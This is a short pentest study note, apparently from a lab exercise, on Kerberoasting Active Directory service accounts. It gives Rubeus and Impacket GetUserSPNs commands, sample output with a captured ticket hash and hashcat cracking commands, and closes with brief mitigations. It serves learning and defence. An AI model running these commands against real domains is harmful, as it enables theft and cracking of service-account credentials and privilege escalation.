* Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password
* If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account
	* Enumeration tool (find all Kerberoastable accounts)
		* BloodHound

#### Method 1 - Rubeus

* This will dump the Kerberos hash of any kerberoastable users
```bash
Rubeus.exe kerberoast

  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER1/SQLService.CONTROLLER.local:30111*$83D90ACC8EBD7123E102CD1E7A662C2D$BA237B9283F1E9B479601DD624E27A59FAFAB00EB889E243A8196545108ED02325C745A2CE65FD2235DFEC797A247558F66F9C8F7D04D9A0D2152BAE173029593F7829B1EC43D14D341B2F2681130DE5BFC7F6294EAD9BEB35F8A3A50787B2251E5961...
```

* copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat

`hashcat -m 13100 -a 0 hash.txt Pass.txt`



#### Method 2 - Impacket

#### insatllation

1.) `cd /opt` navigate to your preferred directory to save tools in 

2.) download the precompiled package from [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)

3.) `cd Impacket-0.9.19` navigate to the impacket directory

4.) `pip install .` - this will install all needed dependencies

#### Impacket Kerberosting

1.) `cd /usr/share/doc/python3-impacket/examples/` - navigate to where GetUserSPNs.py is located

2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.115.157 -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash


#### Kerberoasting Mitigation / Defend

-    Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
-    Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.